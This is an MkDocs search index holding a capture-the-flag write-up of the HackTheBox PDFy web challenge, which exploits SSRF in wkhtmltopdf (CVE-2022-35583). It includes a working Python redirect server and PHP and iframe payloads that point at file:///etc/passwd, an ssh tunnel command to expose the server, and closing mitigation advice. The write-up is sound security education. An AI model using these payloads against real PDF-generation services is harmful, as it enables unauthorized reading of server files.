{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"boxes/","title":"Boxes","text":""},{"location":"crypto/","title":"Cryptography","text":""},{"location":"misc/","title":"Miscellaneous Challenges","text":""},{"location":"pwn/","title":"Binary Exploitation","text":""},{"location":"reverse/","title":"Reverse Engineering","text":""},{"location":"web/","title":"Web Challenges","text":""},{"location":"web/pdfy/","title":"HackTheBox PDFy Web Challenge - Complete Writeup","text":""},{"location":"web/pdfy/#challenge-overview","title":"Challenge Overview","text":"<p>Name: PDFy Category: Web Difficulty: Easy Description:</p> <p>Welcome to PDFy, the exciting challenge where you turn your favorite web pages into portable PDF documents! It's your chance to capture, share, and preserve the best of the internet with precision and creativity. Join us and transform the way we save and cherish web content! NOTE: Leak /etc/passwd to get the flag!</p>"},{"location":"web/pdfy/#technical-background","title":"Technical Background","text":""},{"location":"web/pdfy/#the-vulnerability","title":"The Vulnerability","text":"<p>PDFy is vulnerable to Server-Side Request Forgery (SSRF) due to its utilization of the wkhtmltopdf library. The challenge explicitly tells us we need to leak the contents of <code>/etc/passwd</code> to get the flag, indicating this is likely an SSRF challenge.</p>"},{"location":"web/pdfy/#what-is-wkhtmltopdf","title":"What is wkhtmltopdf?","text":"<p>wkhtmltopdf is a command-line tool that renders HTML into PDF documents using the Qt WebKit rendering engine. It's commonly used in web applications that need to generate PDF reports or document conversions.</p> <p>you can see it in app by entering a wrong url : </p> <p></p>"},{"location":"web/pdfy/#the-vulnerability-cve-2022-35583","title":"The Vulnerability (CVE-2022-35583)","text":"<p>wkhtmltopdf has a known vulnerability (CVE-2022-35583) where it follows HTTP redirects to <code>file://</code> URIs without appropriate validation. This allows attackers to redirect requests to local files, which can lead to information disclosure.</p>"},{"location":"web/pdfy/#reconnaissance","title":"Reconnaissance","text":"<p>Upon accessing the application, we see a simple interface allowing users to convert web pages to PDFs:</p> <p></p> <ol> <li>The user inputs a URL</li> <li>The application fetches that URL and renders it to a PDF using wkhtmltopdf</li> <li>The PDF is stored at <code>/static/pdfs/[filename].pdf</code> and made available for download</li> </ol> <p>Through initial testing with legitimate URLs (like google.com), we can see the application successfully converts webpages to PDFs.</p> <p></p>"},{"location":"web/pdfy/#analyzing-the-application","title":"Analyzing the Application","text":"<p>By examining the application behavior, we can determine:</p> <ol> <li>The application accepts a URL as input via a JSON payload with a <code>url</code> field</li> <li>It passes this URL to wkhtmltopdf for rendering</li> <li>Error messages reveal the use of wkhtmltopdf in the backend</li> <li>The application doesn't appear to have proper URL validation</li> </ol>"},{"location":"web/pdfy/#exploitation-strategy","title":"Exploitation Strategy","text":"<p>The exploitation strategy involves:</p> <ol> <li>Creating a web server that responds with a redirect to <code>file:///etc/passwd</code></li> <li>Making the PDFy application request our malicious server</li> <li>wkhtmltopdf will follow the redirect to the local file</li> <li>The contents of <code>/etc/passwd</code> will be included in the generated PDF</li> </ol>"},{"location":"web/pdfy/#detailed-exploitation-steps","title":"Detailed Exploitation Steps","text":""},{"location":"web/pdfy/#step-1-create-a-redirect-server","title":"Step 1: Create a Redirect Server","text":"<p>We set up a simple HTTP server that redirects all requests to <code>file:///etc/passwd</code>. Since PHP wasn't available in my local, we used Python:</p> <pre><code>import http.server\nimport socketserver\n\nclass RedirectHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        print(\"Received request - redirecting to file:///etc/passwd\")\n        self.send_response(302)\n        self.send_header(\"Location\", \"file:///etc/passwd\")\n        self.end_headers()\n\nPORT = 8081\nHandler = RedirectHandler\n\nwith socketserver.TCPServer((\"\", PORT), Handler) as httpd:\n    print(f\"Server running at port {PORT}\")\n    httpd.serve_forever()\n</code></pre> <p>This server listens on port 8081 and responds to all GET requests with a 302 redirect to <code>file:///etc/passwd</code>.</p> <p></p>"},{"location":"web/pdfy/#step-2-expose-the-local-server-to-the-internet","title":"Step 2: Expose the Local Server to the Internet","text":"<p>Since our server is running locally, we need to make it accessible to the PDFy application. We used localhost.run to create a secure tunnel:</p> <pre><code>ssh -R 80:localhost:8081 nokey@localhost.run\n</code></pre> <p>This command creates a tunnel that forwards traffic from a public URL (provided by localhost.run) to our local server on port 8081. In our case, we received the URL <code>https://9ba152a3947672.lhr.life</code>.</p> <p></p>"},{"location":"web/pdfy/#step-3-submit-the-malicious-url-to-pdfy","title":"Step 3: Submit the Malicious URL to PDFy","text":"<p>We submitted our public URL (<code>https://9ba152a3947672.lhr.life</code>) to the PDFy application.</p> <p></p>"},{"location":"web/pdfy/#step-4-pdfy-processes-the-request","title":"Step 4: PDFy Processes the Request","text":"<p>When PDFy receives our URL:</p> <ol> <li>It passes the URL to wkhtmltopdf for rendering</li> <li>wkhtmltopdf sends a GET request to our server</li> <li>Our server responds with a 302 redirect to <code>file:///etc/passwd</code></li> <li>wkhtmltopdf follows this redirect and attempts to render the local file</li> <li>The contents of <code>/etc/passwd</code> are included in the generated PDF</li> </ol> <p></p>"},{"location":"web/pdfy/#step-5-download-and-view-the-pdf","title":"Step 5: Download and View the PDF","text":"<p>After the PDFy application generates the PDF, we download and open it. The PDF contains the contents of <code>/etc/passwd</code> from the target server, including the flag</p> <p></p>"},{"location":"web/pdfy/#technical-explanation-of-the-vulnerability","title":"Technical Explanation of the Vulnerability","text":"<p>The vulnerability exists because:</p> <ol> <li>Improper URL Validation: The application doesn't validate or sanitize the URL input</li> <li>Redirect Handling: wkhtmltopdf follows HTTP redirects without proper validation</li> <li>Protocol Handling: wkhtmltopdf allows access to the <code>file://</code> URI scheme, which should never be accessible from a web-driven PDF generator</li> </ol> <p>When wkhtmltopdf follows a redirect to a <code>file://</code> URI, it attempts to read the file from the local filesystem of the server running the wkhtmltopdf process. This allows attackers to read sensitive files from the server.</p> <p></p>"},{"location":"web/pdfy/#alternative-exploitation-approaches","title":"Alternative Exploitation Approaches","text":""},{"location":"web/pdfy/#using-php-if-available","title":"Using PHP (if available)","text":"<pre><code>&lt;?php\nheader(\"Location: file:///etc/passwd\");\n?&gt;\n</code></pre>"},{"location":"web/pdfy/#using-iframes-also-effective","title":"Using iframes (also effective)","text":"<p>An alternative approach would be to use an iframe in HTML:</p> <pre><code>&lt;iframe src=\"http://your-server/redirect.php?x=/etc/passwd\" width=\"1000px\" height=\"1000px\"&gt;&lt;/iframe&gt;\n</code></pre> <p>Where <code>redirect.php</code> contains:</p> <pre><code>&lt;?php \nheader('location:file://'.$_REQUEST['x']); \n?&gt;\n</code></pre>"},{"location":"web/pdfy/#mitigation-recommendations","title":"Mitigation Recommendations","text":"<p>To prevent this type of vulnerability, developers should:</p> <ol> <li>Implement URL Validation: Only allow specific URL schemes (http, https) and domains</li> <li>Disable File Protocol: Explicitly disable the <code>file://</code> protocol in wkhtmltopdf with the <code>--disable-local-file-access</code> flag</li> <li>Use a Whitelist Approach: Only allow conversion of URLs from trusted domains</li> <li>Update Libraries: Keep wkhtmltopdf and other dependencies updated to patched versions</li> <li>Run in Isolation: Run the PDF generation process in a containerized environment with minimal privileges</li> </ol>"},{"location":"web/pdfy/#lessons-learned","title":"Lessons Learned","text":"<ol> <li>Always Validate User Input: Any user-controlled input that affects server-side operations must be properly validated and sanitized</li> <li>Understand Your Tools: Understanding the security implications of libraries like wkhtmltopdf is critical</li> <li>Protocol Security: Special attention should be paid to applications that handle multiple URL protocols</li> <li>Defense in Depth: Multiple layers of protection are needed when dealing with user-controlled URLs</li> </ol>"},{"location":"web/pdfy/#conclusion","title":"Conclusion","text":"<p>The PDFy challenge demonstrates a common vulnerability in web applications that generate PDFs from HTML content. By exploiting the SSRF vulnerability in wkhtmltopdf, we were able to read sensitive files from the target server and obtain the flag.</p> <p>This type of vulnerability is particularly dangerous because it can lead to information disclosure, internal network scanning, and potentially remote code execution. Understanding how to identify and exploit such vulnerabilities is crucial for web application security testing.</p>"},{"location":"web/pdfy/#appendix-references","title":"Appendix: References","text":"<ul> <li>CVE-2022-35583 - wkhtmltopdf vulnerability details</li> <li>wkhtmltopdf SSRF - Exploit documentation</li> <li>HackTheBox PDFy Challenge - Original challenge (requires HTB account)</li> <li>localhost.run - Tool used for exposing local server</li> </ul>"}]}